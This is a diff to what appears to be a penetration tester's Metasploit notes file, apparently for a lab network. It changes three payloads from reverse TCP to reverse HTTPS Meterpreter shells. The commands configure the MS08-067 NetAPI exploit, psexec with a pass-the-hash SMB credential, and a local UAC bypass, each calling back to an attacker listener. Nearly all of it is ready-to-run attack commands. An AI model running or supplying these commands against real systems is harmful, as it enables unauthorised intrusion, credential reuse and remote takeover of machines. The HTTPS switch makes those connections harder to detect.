@@ -384,7 +384,7 @@ notes -S "Anonymous FTP login Allowed"
 ####  MS08_067 NET API #######
 ##############################
 use exploit/windows/smb/ms08_067_netapi
-set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_https
 set LHOST 10.11.0.164
 set LPORT 4444
 set RHOST 10.11.1.227
@@ -408,7 +408,7 @@ set SMBPass 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af
 set THREADS 50
 
 use exploit/windows/smb/psexec
-set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_https
 set LPORT 4445
 set LHOST 10.11.0.164
 set RHOST 10.11.1.227
@@ -421,7 +421,7 @@ set target 2
 #### BYPASS UAC     #########
 ##############################
 use exploit/windows/local/bypassuac
-set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_https
 set LHOST 10.11.0.164
 set LPORT 443
 set SESSION 3
